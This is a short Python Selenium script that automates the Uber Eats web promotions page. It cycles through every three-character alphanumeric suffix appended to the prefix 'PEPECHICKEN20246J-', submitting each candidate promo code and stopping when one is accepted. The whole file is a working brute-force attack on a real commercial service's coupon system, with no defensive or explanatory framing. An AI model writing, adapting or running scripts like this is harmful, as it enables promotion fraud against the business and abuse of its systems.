from selenium import webdriver
from selenium.webdriver.remote.webelement import WebElement
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import time


# driver
driver = webdriver.Chrome(service=ChromeService())
driver.get("https://ubereats.com/fr-en/feed?")
input("Press Enter to continue...")

driver.find_element(By.XPATH, "//button[@data-testid='menu-button']").click()
time.sleep(1)
driver.find_element(By.XPATH, "//a[@data-testid='menu-promotions-button']").click()
time.sleep(10)

base = "PEPECHICKEN20246J-"
allAlphaNum = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for v1 in allAlphaNum:
    for v2 in allAlphaNum:
        for v3 in allAlphaNum:
            print(base + v1 + v2+v3)
            driver.find_element(By.XPATH, "//input[@placeholder='Enter promo code']").send_keys(base + v1 + v2+v3)
            driver.find_element(By.XPATH, "//button[text()='Apply']").click()
            time.sleep(2)
            if len(driver.find_elements(By.XPATH, "//div[@data-baseweb='form-control-caption']")) == 0:
                print(base + v1 + v2+v3 + " is valid")
                exit()
